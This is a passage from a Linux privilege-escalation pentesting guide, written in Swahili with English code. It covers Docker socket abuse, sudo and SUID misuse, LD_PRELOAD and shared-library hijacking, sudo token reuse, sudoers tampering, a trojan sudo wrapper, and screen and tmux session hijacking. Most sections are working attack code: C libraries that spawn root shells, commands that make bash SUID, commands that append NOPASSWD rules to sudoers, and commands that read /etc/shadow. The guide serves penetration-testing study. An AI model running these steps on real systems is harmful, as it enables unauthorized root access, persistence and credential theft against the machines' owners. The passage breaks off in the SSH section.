Hizi amri zinakuwezesha kuendesha container yenye ufikiaji wa root kwenye mfumo wa faili wa host.

#### **Kutumia Docker API Moja kwa Moja**

Katika matukio ambapo Docker CLI haipatikani, Docker socket bado inaweza kutendewa kwa kutumia Docker API na amri za `curl`.

1.  **List Docker Images:** Pata orodha ya Docker images zilizopo.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Tuma ombi kuunda container inayopachika saraka ya mizizi (/) ya host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Tumia `socat` kuanzisha muunganisho kwenye container, kuwezesha utekelezaji wa amri ndani yake.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Baada ya kuanzisha muunganisho wa `socat`, unaweza kutekeleza amri moja kwa moja ndani ya container kwa ufikiaji wa root kwenye mfumo wa faili wa host.

### Vingine

Kumbuka kwamba ikiwa una ruhusa za kuandika kwenye docker socket kwa sababu uko **inside the group `docker`** you have [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Ikiwa [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Angalia njia zaidi za kutoroka kutoka docker au kuitumia vibaya kuinua vibali katika:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Kama ugundua kwamba unaweza kutumia amri ya **`ctr`**, soma ukurasa ufuatao kwani **utaweza kuuitumia vibaya kuinua vibali**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Kama ugundua kwamba unaweza kutumia amri ya **`runc`**, soma ukurasa ufuatao kwani **utaweza kuuitumia vibaya kuinua vibali**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ni mfumo wa hali ya juu wa inter-Process Communication (IPC) unaowawezesha programu kuingiliana kwa ufanisi na kubadilishana data. Umebuniwa kwa kuzingatia mfumo wa kisasa wa Linux, unatoa mfumo imara kwa aina mbalimbali za mawasiliano ya programu.

Mfumo ni wenye kubadilika, ukisaidia IPC msingi unaoboreshwa wa kubadilishana data kati ya michakato, ukikumbusha enhanced UNIX domain sockets. Zaidi ya hayo, unasaidia kutangaza matukio au ishara, ukichochea ujumuishaji usio na mshono kati ya vipengele vya mfumo. Kwa mfano, ishara kutoka kwa daemon ya Bluetooth kuhusu simu inayoingia inaweza kusababisha music player kuzimwa, ikiboresha uzoefu wa mtumiaji. Aidha, D-Bus inaunga mkono mfumo wa remote object, kurahisisha maombi ya huduma na miito ya methodi kati ya programu, na kurefusha michakato ambayo hapo awali ilikuwa ngumu.

D-Bus hufanya kazi kwa mfano wa allow/deny, ikisimamia ruhusa za ujumbe (method calls, signal emissions, n.k.) kulingana na athari ya jumla ya kanuni za sera zinazofanana. Sera hizi zinaelekeza jinsi bus inavyoweza kuingiliana, na zinaweza kuruhusu kuinuliwa kwa vibali kupitia unyonyaji wa ruhusa hizi.

Mfano wa sera kama hiyo katika `/etc/dbus-1/system.d/wpa_supplicant.conf` umetolewa, ukielezea ruhusa kwa user root kumiliki, kutuma, na kupokea ujumbe kutoka `fi.w1.wpa_supplicant1`.

Sera ambazo hazina user au group maalumu zinatumika kwa wote, wakati sera za muktadha "default" zinahusu wote wasiotajwa na sera maalumu nyingine.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Jifunze jinsi ya enumerate na exploit mawasiliano ya D-Bus hapa:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mtandao**

Daima ni ya kuvutia ku-enumerate mtandao na kubaini nafasi ya mashine.

### Enumeration ya jumla
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

Daima angalia huduma za mtandao zinazoendesha kwenye mashine ambazo hukuweza kuingiliana nazo kabla ya kuifikia:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Angalia kama unaweza sniff traffic. Ikiwa unaweza, unaweza kuwa na uwezo wa kupata credentials kadhaa.
```
timeout 1 tcpdump
```
## Watumiaji

### Kuorodhesha kwa Jumla

Angalia **nani** wewe, ni **idhini** gani unazo, ni **watumiaji** gani wako katika mifumo, ni gani wanaweza **login** na ni gani wana **root privileges**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### UID Kubwa

Toleo fulani za Linux zilipata hitilafu inayowawezesha watumiaji wenye **UID > INT_MAX** kuinua ruhusa. Taarifa zaidi: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Vikundi

Angalia kama wewe ni **mwanachama wa kundi fulani** ambalo lingeweza kukupa ruhusa za root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Ubao la kunakili

Angalia ikiwa kuna kitu chochote cha kuvutia kipo ndani ya ubao la kunakili (ikiwa inawezekana)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Sera ya Nywila
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Nywila zinazojulikana

Kama **unajua nywila yoyote** ya mazingira, **jaribu kuingia kama kila mtumiaji** ukitumia nywila hiyo.

### Su Brute

Ikiwa haujali kuhusu kusababisha kelele nyingi na binaries za `su` na `timeout` ziko kwenye kompyuta, unaweza kujaribu brute-force mtumiaji kwa kutumia [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) kwa parameter `-a` pia inaweza kujaribu brute-force watumiaji.

## Matumizi mabaya ya PATH inayoweza kuandikwa

### $PATH

Kama ugundua kwamba unaweza **kuandika ndani ya folda fulani ya $PATH** unaweza kuwa na uwezo wa kuongeza vibali kwa **kuunda backdoor ndani ya folda inayoweza kuandikwa** kwa jina la amri fulani ambayo itatekelezwa na mtumiaji mwingine (root kwa kiwango bora) na ambayo **haitapakiwa kutoka kwenye folda iliyoko kabla** ya folda yako inayoweza kuandikwa katika $PATH.

### SUDO and SUID

Unaweza kuruhusiwa kutekeleza amri fulani ukitumia sudo au zinaweza kuwa na suid bit. Angalia kwa kutumia:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Baadhi ya **amri zisizotarajiwa zinakuwezesha kusoma na/au kuandika mafaili au hata kutekeleza amri.** Kwa mfano:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Mipangilio ya sudo inaweza kumruhusu mtumiaji kutekeleza amri fulani kwa nyadhifa za mtumiaji mwingine bila kujua password.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Katika mfano huu mtumiaji `demo` anaweza kuendesha `vim` kama `root`, sasa ni rahisi kupata shell kwa kuongeza ssh key kwenye saraka ya root au kwa kuita `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Kielekezo hiki kinaruhusu mtumiaji **set an environment variable** wakati wa kutekeleza kitu:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Mfano huu, **iliyotokana na HTB machine Admirer**, ulikuwa **nyeti** kwa **PYTHONPATH hijacking** ili kupakia maktaba yoyote ya python wakati script ikiendeshwa kama root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV imehifadhiwa kupitia sudo env_keep → root shell

Ikiwa sudoers inahifadhi `BASH_ENV` (kwa mfano, `Defaults env_keep+="ENV BASH_ENV"`), unaweza kutumia tabia ya kuanzisha ya Bash isiyo-interactive ili kuendesha msimbo wowote kama root unapoitisha amri iliyoruhusiwa.

- Kwa nini inafanya kazi: Kwa shells zisizo-interactive, Bash inatafsiri `$BASH_ENV` na inasoma (sources) faili hiyo kabla ya kuendesha script lengwa. Kanuni nyingi za sudo zinaruhusu kuendesha script au shell wrapper. Kama `BASH_ENV` inahifadhiwa na sudo, faili yako itasomwa (sourced) kwa ruhusa za root.

- Mahitaji:
- Kanuni ya sudo unayoweza kuendesha (lengo lolote linaloitisha `/bin/bash` isiyo-interactive, au script yoyote ya bash).
- `BASH_ENV` iwepo ndani ya `env_keep` (angalia kwa kutumia `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Ondoa `BASH_ENV` (na `ENV`) kutoka `env_keep`; tumia `env_reset`.
- Epuka wrapper za shell kwa amri zinazoruhusiwa na sudo; tumia binaries ndogo.
- Fikiria logging ya I/O ya sudo na utoaji wa tahadhari wakati variable za mazingira zilizohifadhiwa zinapotumika.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Ikiwa `sudo -l` inaonyesha `env_keep+=PATH` au `secure_path` ikiwa na entries ambazo mshambuliaji anaweza kuandika (mfano, `/home/<user>/bin`), amri yoyote isiyo na njia kamili ndani ya lengo linaloruhusiwa na sudo inaweza kufunikwa.

- Requirements: sheria ya sudo (mara nyingi `NOPASSWD`) inayotekeleza script/binary inayoitisha amri bila njia kamili (`free`, `df`, `ps`, etc.) na entry ya PATH inayoweza kuandikwa ambayo inatafutwa kwanza.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Njia za kuepuka utekelezaji wa Sudo
**Ruka** kusoma mafaili mengine au tumia **symlinks**. Kwa mfano, katika faili ya sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ikiwa **wildcard** inatumika (\*), ni rahisi zaidi:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Hatua za kukabiliana**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bila njia ya amri

Ikiwa **idhini ya sudo** imetolewa kwa amri moja tu **bila kutaja njia**: _hacker10 ALL= (root) less_ unaweza ku-exploit kwa kubadilisha PATH variable
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Mbinu hii pia inaweza kutumika ikiwa binary ya **suid** **hufanya amri nyingine bila kutaja njia yake (daima angalia na** _**strings**_ **maudhui ya binary ya SUID isiyo ya kawaida)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary na command path

Ikiwa binary ya **suid** **inatekeleza amri nyingine ikibainisha njia**, basi, unaweza kujaribu **export a function** uitwayo kama amri ambayo faili ya suid inaiita.

Kwa mfano, ikiwa suid binary inaita _**/usr/sbin/service apache2 start**_ lazima ujaribu kuunda function na ku-export:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Kisha, unapoiita suid binary, function hii itaendeshwa

### LD_PRELOAD & **LD_LIBRARY_PATH**

Kigezo cha mazingira **LD_PRELOAD** kinatumika kutaja maktaba za pamoja (.so files) moja au zaidi ambazo loader itapakia kabla ya nyingine zote, ikiwemo maktaba ya kawaida ya C (`libc.so`). Mchakato huu unajulikana kama kupakia maktaba mapema.

Hata hivyo, ili kudumisha usalama wa mfumo na kuzuia kipengele hiki kutumika vibaya, hasa kwenye executables za **suid/sgid**, mfumo unalazimisha masharti fulani:

- Loader haizingatii **LD_PRELOAD** kwa executables ambapo real user ID (_ruid_) haifanana na effective user ID (_euid_).
- Kwa executables zenye suid/sgid, maktaba zilizoko katika njia za kawaida ambazo pia zina sifa za suid/sgid ndizo tu zinazopakiwa mapema.

Kupandishwa kwa ruhusa kunaweza kutokea ikiwa una uwezo wa kuendesha amri kwa `sudo` na matokeo ya `sudo -l` yanajumuisha taarifa **env_keep+=LD_PRELOAD**. Mpangilio huu unaruhusu kigezo cha mazingira **LD_PRELOAD** kudumu na kutambuliwa hata wakati amri zinaendeshwa kwa `sudo`, jambo ambalo linaweza kusababisha utekelezwaji wa msimbo wowote kwa ruhusa zilizoongezeka.
```
Defaults        env_keep += LD_PRELOAD
```
Hifadhi kama **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Kisha **compile it** ukitumia:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Hatimaye, **escalate privileges** ukiendesha
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Privesc inayofanana inaweza kutumika vibaya ikiwa attacker anadhibiti env variable **LD_LIBRARY_PATH** kwa sababu yeye anadhibiti njia ambamo libraries zitatafutwa.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Unapokutana na binary yenye **SUID** permissions inayonekana isiyo ya kawaida, ni desturi nzuri kuthibitisha kama inachukua faili za **.so** kwa usahihi. Hii inaweza kuthibitishwa kwa kukimbia amri ifuatayo:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Kwa mfano, kukutana na kosa kama _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ kunaonyesha uwezekano wa exploitation.

Ili exploit hii, mtu angeendelea kwa kuunda faili ya C, sema _"/path/to/.config/libcalc.c"_, lenye msimbo ufuatao:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Msimbo huu, mara utakapoukusanywa na kutekelezwa, unalenga kuinua ruhusa kwa kubadilisha ruhusa za faili na kutekeleza shell yenye ruhusa za juu.

Kusanya faili ya C iliyo hapo juu kuwa shared object (.so) kwa:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Hatimaye, kuendesha SUID binary iliyoathirika kunapaswa kuchochea exploit, kuruhusu uwezekano wa system compromise.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sasa baada ya kupata SUID binary inayopakia library kutoka kwenye folder tunaoweza kuandika, tutengeneze library katika folder hiyo kwa jina linalohitajika:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ikiwa utapata kosa kama
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
Hiyo inamaanisha kwamba maktaba uliyoitengeneza inahitaji kuwa na function inayoitwa `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ni orodha iliyochaguliwa ya binaries za Unix ambazo mshambuliaji anaweza kuzitumia kupitisha vizuizi vya usalama vya eneo. [**GTFOArgs**](https://gtfoargs.github.io/) ni sawa lakini kwa kesi ambapo unaweza **kuingiza vigezo pekee** katika amri.

Mradi huu unakusanya kazi halali za binaries za Unix ambazo zinaweza kutumiwa vibaya kuvunja restricted shells, kuinua au kudumisha elevated privileges, kuhamisha faili, kuanzisha bind and reverse shells, na kuwezesha kazi nyingine za post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Ikiwa unaweza kufikia `sudo -l` unaweza kutumia zana [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) ili kuangalia ikiwa inapata jinsi ya exploit sheria yoyote ya sudo.

### Reusing Sudo Tokens

Katika kesi ambapo una **sudo access** lakini huna nenosiri, unaweza kuinua privileges kwa **kusubiri utekelezaji wa amri ya sudo kisha ku-hijack session token**.

Requirements to escalate privileges:

- Tayari una shell kama mtumiaji "_sampleuser_"
- "_sampleuser_" amekuwa **akitumia `sudo`** kutekeleza kitu katika **dakika 15 zilizopita** (kwa chaguo-msingi huo ndio muda wa sudo token unaotuwezesha kutumia `sudo` bila kuingiza nenosiri)
- `cat /proc/sys/kernel/yama/ptrace_scope` ni 0
- `gdb` inapatikana (unaweza kuweza kuipakia)

(Unaweza kuwasha kwa muda `ptrace_scope` kwa `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` au kwa kudumu kubadilisha `/etc/sysctl.d/10-ptrace.conf` na kuweka `kernel.yama.ptrace_scope = 0`)

Ikiwa vigezo vyote hivi vimetimizwa, **unaweza kuinua privileges kwa kutumia:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) itaunda binary `activate_sudo_token` katika _/tmp_. Unaweza kuitumia **kuamsha sudo token katika session yako** (hautapata root shell moja kwa moja, fanya `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **second exploit** (`exploit_v2.sh`) itaunda sh shell katika _/tmp_ **inayomilikiwa na root na yenye setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **exploit ya tatu** (`exploit_v3.sh`) ita **kuunda sudoers file** ambayo inafanya **sudo tokens zisizoisha na kuruhusu watumiaji wote kutumia sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Ikiwa una **idhinishaji la kuandika** kwenye folda au kwa yoyote ya faili zilizotengenezwa ndani ya folda, unaweza kutumia binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) ku**unda sudo token kwa mtumiaji na PID**.\
Kwa mfano, ikiwa unaweza kuandika tena faili _/var/run/sudo/ts/sampleuser_ na una shell kama mtumiaji huyo mwenye PID 1234, unaweza **kupata ruhusa za sudo** bila kuhitaji kujua nenosiri kwa kufanya:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Faili `/etc/sudoers` na faili zilizomo ndani ya `/etc/sudoers.d` zinadhibiti nani anaweza kutumia `sudo` na jinsi. Faili hizi **kwa chaguo-msingi zinaweza kusomwa tu na mtumiaji root na kundi root**.\
**If** unaweza **read** faili hii unaweza kupata baadhi ya taarifa za kuvutia, na ikiwa unaweza **write** faili yoyote utaweza **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ikiwa unaweza kuandika, unaweza kutumia vibaya ruhusa hii
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Njia nyingine ya kutumia vibaya ruhusa hizi:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Kuna baadhi ya mbadala kwa binary ya `sudo` kama `doas` kwa OpenBSD, kumbuka kukagua usanidi wake kwenye `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Ikiwa unajua kwamba **user kawaida hujiunga na machine na kutumia `sudo`** ili kuongeza privileges na umepata shell ndani ya muktadha wa user huyo, unaweza **kuunda executable mpya ya sudo** itakayotekeleza msimbo wako kama root kisha amri ya user. Kisha, **badilisha $PATH** ya muktadha wa user (kwa mfano kwa kuongeza path mpya katika .bash_profile) ili wakati user anatekeleza sudo, executable yako ya sudo itatekelezwa.

Kumbuka kwamba ikiwa user anatumia shell tofauti (si bash) utahitaji kubadilisha faili nyingine ili kuongeza path mpya. Kwa mfano [sudo-piggyback](https://github.com/APTy/sudo-piggyback) inabadilisha `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Unaweza kupata mfano mwingine katika [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Au kuendesha kitu kama:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Maktaba Iliyoshirikiwa

### ld.so

Faili `/etc/ld.so.conf` inaonyesha **wapi faili za usanidi zilizopakiwa zinatoka**. Kawaida, faili hii ina njia ifuatayo: `include /etc/ld.so.conf.d/*.conf`

Hii inamaanisha kwamba faili za usanidi kutoka `/etc/ld.so.conf.d/*.conf` zitasomwa. Faili hizi za usanidi zinaonyesha **folda nyingine** ambako **libraries** zitatafutwa. Kwa mfano, yaliyomo kwenye `/etc/ld.so.conf.d/libc.conf` ni `/usr/local/lib`. **Hii inamaanisha kwamba mfumo utatafuta libraries ndani ya `/usr/local/lib`**.

Ikiwa kwa sababu yoyote **mtumiaji ana write permissions** kwenye mojawapo ya njia zilizoonyeshwa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, faili yoyote ndani ya `/etc/ld.so.conf.d/` au folda yoyote iliyoainishwa ndani ya faili ya usanidi ndani ya `/etc/ld.so.conf.d/*.conf` anaweza kuwa na uwezo wa **escalate privileges**.\
Tazama **how to exploit this misconfiguration** katika ukurasa ufuatao:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kwa kunakili lib ndani ya `/var/tmp/flag15/` itatumiwa na programu katika sehemu hii kama ilivyobainishwa katika kigezo `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Kisha unda maktaba ya uovu katika `/var/tmp` kwa kutumia `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Uwezo

Uwezo za Linux hutoa **sehemu ndogo ya vibali vya root vinavyopatikana kwa mchakato**. Hii inavunja kwa ufanisi vibali vya root **kuwa vifungu vidogo na vinavyotofautiana**. Kila moja ya vifungu hivi inaweza kisha kupewa mchakato kwa kujitegemea. Kwa njia hii seti kamili ya vibali inapunguzwa, ikipunguza hatari za matumizi mabaya.\  
Soma ukurasa ufuatao ili **ujifunze zaidi kuhusu uwezo na jinsi ya kuyatumia vibaya**:

{{#ref}}
linux-capabilities.md
{{#endref}}

## Ruhusa za katalogi

Katika katalogi, biti ya **"execute"** ina maana kwamba mtumiaji aliyeathirika anaweza "**cd**" ndani ya folda.\  
Biti ya **"read"** inaonyesha mtumiaji anaweza **kuorodhesha** **faili**, na biti ya **"write"** inaonyesha mtumiaji anaweza **kufuta** na **kuunda** faili mpya.

## ACLs

Access Control Lists (ACLs) zinaonyesha tabaka la pili la ruhusa za hiari, zenye uwezo wa **kupindua ruhusa za jadi za ugo/rwx**. Ruhusa hizi zinaongeza udhibiti juu ya ufikiaji wa faili au katalogi kwa kuruhusu au kukataa haki kwa watumiaji maalum ambao si wamiliki au hawapo sehemu ya kundi. Kiwango hiki cha **ugawaji wa kina kinahakikisha usimamizi wa ufikiaji ulio sahihi zaidi**. Maelezo zaidi yanaweza kupatikana [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Mpa** mtumiaji "kali" ruhusa za 'read' na 'write' juu ya faili:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pata** faili zenye ACLs maalum kutoka kwenye mfumo:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Fungua shell sessions

Katika **matoleo ya zamani** unaweza **hijack** baadhi ya **shell** session ya mtumiaji tofauti (**root**).\
Katika **matoleo mapya zaidi** utaweza tu **connect** kwa screen sessions za **mtumiaji wako mwenyewe**. Hata hivyo, unaweza kupata **taarifa zenye kuvutia ndani ya session**.

### screen sessions hijacking

**Orodhesha screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Unganisha kwenye session**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Hii ilikuwa tatizo kwa **toleo za zamani za tmux**. Sikuweza kuvamia session ya tmux (v2.1) iliyoundwa na root kama mtumiaji asiye na ruhusa.

**Orodhesha sessions za tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Unganisha kwenye session**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** kwa mfano.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
